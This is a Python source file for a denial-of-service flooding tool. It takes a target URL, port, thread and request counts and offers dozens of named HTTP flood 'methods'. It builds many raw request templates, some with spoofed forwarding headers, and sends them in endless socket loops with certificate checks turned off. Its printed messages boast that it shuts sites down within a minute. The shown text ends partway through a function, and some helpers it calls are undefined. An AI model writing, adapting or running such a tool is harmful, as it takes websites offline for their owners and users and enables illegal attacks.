import socket
import threading
import argparse
import random
import os
import time
import requests
import cloudscraper
from colorama import Fore
from urllib.parse import urlparse
from random import choice as che
from random import randint as ran
from random import _urandom as byt
from certifi import where
from ssl import CERT_NONE, SSLContext, create_default_context
from threading import Thread as thr
from colorama import init as colorama_init
from http.client import HTTPResponse as httpr
from requests import get
colorama_init(autoreset=True)

app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']

os.system('cls' if os.name == 'nt' else 'clear')

banner = Fore.LIGHTGREEN_EX+"""
:::::.    .:::::.               .:^^:.       .   :!!.                                     
         :YJYJJY?!  ~YJYJJJ?~            7JJJJYY7     ?Y~  ~JJ:                                     
         ^YY~ .^JJJ ~JY^ .~YJ?  ~?JJ?7: :5J?...^.   :JY?Y?7^JJ..??7JJ?7!?J?7.  ^7JJ?7: !???JJ.      
         ^YY~   !JY:~YY:   7JY:JJJ^:!YY~ ~?JJJ7~.   .~YJ?^:~JY:.5JJ^~YJY~^JJJ 7YY!~7YY.?JY7^^       
         ^YY~   7J5.~YY:   ??Y~YJ~   Y?J   .^~JJY:   .YJ!  ~JY:.YJ!  Y??  J?Y.5?Y???JJ:?JY          
         ^YJ7^~?YJ~ ~YY!^~?YJ^ JJJ^:!YY~^Y7~::?JY:   .YJ?::!JY:.5J7  YJ?  J?Y ?JY!^^!~ ?JY          
         :J????7~.  ^J????7~.  .~?JJJ7: :!?JJJ?!:     ~?JJ?^JJ..?J~  ??!  !??  ^7JJJ?! !??          
                                                                                                    
                                                                                                    
                                                                                                    
                                                                        """

print(banner)

parser = argparse.ArgumentParser()
parser.add_argument('m',help="METHOD")
parser.add_argument('u', help="ENTER TARGET WITH HTTP , HTTPS")
parser.add_argument('p', help="ENTER PORT [HTTP = 80 HTTPS = 443]", type=int)
parser.add_argument('t', help="THREADS | MAX = UNLIMITED", type=int)
parser.add_argument('r', help="RPC | MAX = UNLIMITED", type=int)
parser.add_argument('-method',help="METHODS | LAYER7 :  raw , war , mix , get , waf , http , bypass , uam , sky , boom , stress , cfb , cf , veep , head , attack , gpt , raw2 , onec , https , gurd , bypass+ , browser , war+ , requests , get2 , requests2 , cf+ , ovh , ovh-bypass , spoof , uam2 , war++ , waf+ , boom+ , http2 , cfbpro , pps| Layer4 syn , tcp , udp , rtcp , rudp")
parser.add_argument('-example',help="example : python dosi.py war http://example.com 80 100 1000 1000")
args = parser.parse_args()

method = args.m
url = args.u
port = args.p
threads = args.t
rpc = args.r

parsed_url = urlparse(url)
target = parsed_url.netloc
ip = socket.gethostbyname(target)

print(Fore.LIGHTYELLOW_EX + f"TARGET = {url} PORT = {port} METHOD = {method} THREAD = {threads} RPC = {rpc}")
time.sleep(1.5)
print(Fore.LIGHTCYAN_EX + "if this tool is executed and the site you want is not shut down, run it in 2 or 5 systems")
time.sleep(0.5)
print(Fore.LIGHTRED_EX + "In normal mode, this tool shuts down the site in 30 to 1 minute after running it. If the site does not shut down, it needs to be bypassed.")
time.sleep(2.5)
print(Fore.LIGHTRED_EX+"["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")

ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
]

ssl = create_default_context(cafile=where())
ssl.check_hostname = False
ssl.verify_mode = CERT_NONE

def spo_ip():
	addr = [192, 168, 0, 1]; d = '.'; addr[0] = str(ran(11, 197)); addr[1] = str(ran(0, 255)); addr[2] = str(ran(0, 255)); addr[3] = str(ran(2, 254)); ass = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]; return ass

def generate_payload():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n'.encode(encoding='utf-8')

def generate_payload1():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\nAccept: {che(app)}\r\nAccept-Ranges: bytes\r\nCache-Control: max-age=0\r\n\r\n'.encode(encoding='utf-8')

def generate_payload2():
    return f'HEAD / HTTP/1.1\r\nHost:{target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\n\r\n'.encode(encoding='utf-8')

def generate_payload3():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nReferer: {che(reff)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload4():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload5():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nConnection: keep-alive\r\n\r\n'.encode(encoding='utf-8')

def generate_payload6():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\n\r\n'.encode(encoding='utf-8')

def generate_payload7():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: Windows\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\n\r\n'.encode(encoding='utf-8')

def generate_payload8():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: no-cache\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nConnection: Keep-Alive\r\n\r\n'.encode(encoding='utf-8')

def generate_payload9():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\nCache-Control: max-age=0\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\nConnection: Keep-Alive\r\n'.encode(encoding='utf-8')

def generate_payload10():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: no-cache\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nConnection: Keep-Alive\r\n\r\n'.encode(encoding='utf-8')

def generate_payload11():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n'.encode(encoding='utf-8') 

def generate_payload12():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agnet: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nVary: Accept-Encoding\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: max-age=0\r\nX-Frame-Options: sameorigin\r\n\r\n'.encode(encoding='utf-8')

def generate_payload13():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload14():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8') 

def generate_payload15():
    return f'HEAD / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload16():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload17():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nCache-Control: max-age=0\r\nKeep-Alive: timeout=5, max=100\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8\r\nServer: cloudflare,ddos-gurd,nginx.apache'.encode(encoding='utf-8')

def generate_payload18():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nCache-Control: max-age=0\r\nConnection: close\r\n\r\n'.encode(encoding='utf-8')

def generate_payload19():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9\r\nCache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nConnection: keep-alive\r\n\r\n'.encode(encoding='utf-8')

def generate_payload20():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache\r\nContent-Type: text/html\r\nContent-Length: 30952\r\nX-Frame-Options: SAMEORIGIN\r\nX-Content-Type-Options: nosniff\r\n\r\n'.encode(encoding='utf-8')

def generate_payload21():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nConnection: keep-alive\r\nKeep-Alive: timeout=60\r\nContent-Security-Policy: upgrade-insecure-requests;\r\nAccess-Control-Allow-Origin: *,*\r\nAccess-Control-Allow-Headers: PUT, GET, POST, DELETE, OPTIONS\r\nTransfer-Encoding: chunked\r\nCache-Control: max-age=30, public, s-maxage=1800\r\nContent-Type: text/html; charset=UTF-8\r\nServer: ddos-gurd\r\nX-Powered-By: PHP/7.2.2\r\n\r\n'.encode(encoding='utf-8')

def generate_payload22():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Cotrol: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload23():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,\r\nCache-Cotrol: no-cache\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload24():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en;q=0.5\r\nContent-Type: text/html;charset=utf-8\r\nTransfer-Encoding: chunked\r\nConnection: close\r\nCache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nX-Frame-Options: SAMEORIGIN\r\nVary: Accept-Encoding\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload25():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nCache-Control: max-age=0\r\nConnection: close\r\nX-Frame-Options: DENY\r\nX-Content-Type-Options: nosniff\r\nReferrer-Policy: same-origin\r\nCross-Origin-Opener-Policy: same-origin\r\nContent-Length: 62376\r\nContent-Type: text/html; charset=utf-8\r\n\r\n'.encode(encoding='utf-8')

def generate_payload26():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agnet: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nCache-Control: max-age=0\r\nsec-ch-ua-mobile: ?0\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\n\r\n'.encode(encoding='utf-8')

def generate_payload27():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agnet: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\nConnection: Keep-Alive\r\nCache-Control: max-age=0\r\nsec-ch-ua: "Chromium";v="116", "Google Chrome";v="116"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\nservice-worker-navigation-preload: true\r\nupgrade-insecure-requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload28():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n'.encode(encoding='utf-8')

def generate_payload29():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload30():
    return f'GET /?{strm(6)}={strm(6)}={strm(6)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n'.encode()

def generate_payload31():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nsec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\n\r\n'.encode(encoding='utf-8')

def generate_payload32():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,\r\nCache-Cotrol: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def genrate_payload33():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nConnection: close\r\nAccept: {che(app)}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\n\r\n'.encode(encoding='utf-8')

def generate_payload34():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload35():
    return f'GET / HTTP/2.0\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Cotrol: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def generate_payload36():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferre: {che(reff)}\r\n\r\n'.encode(encoding='utf-8')

def generate_payload37():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\nAccept-Encoding: deflate, gzip;q=1.0, *;q=0.5\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode(encoding='utf-8')

def raw():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload()
                s.send(payl)
        except:
            pass

def war():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload1()
                s.send(payl)
        except:
            pass

def mix():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload2()
                s.send(payl)
        except:
            pass

def get():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload3()
                s.send(payl)
        except:
            pass

def waf():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload4()
                s.send(payl)
        except:
            pass

def http():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload5()
                s.send(payl)
        except:
            pass

def bypass():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload6()
                s.send(payl)
        except:
            pass

def uam():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload7()
                s.send(payl)
        except:
            pass

def sky():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload8()
                s.send(payl)
        except:
            pass

def boom():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload9()
                s.send(payl)
        except:
            pass

def stress():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload10()
                s.send(payl)
        except:
            pass

def veep():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload11()
                s.send(payl)
        except:
            pass

def cfb():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload12()
                s.send(payl)
        except:
            pass

def cf():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload13()
                s.send(payl)
        except:
            pass

def crash():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload14()
                s.send(payl)
        except:
            pass

def head():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
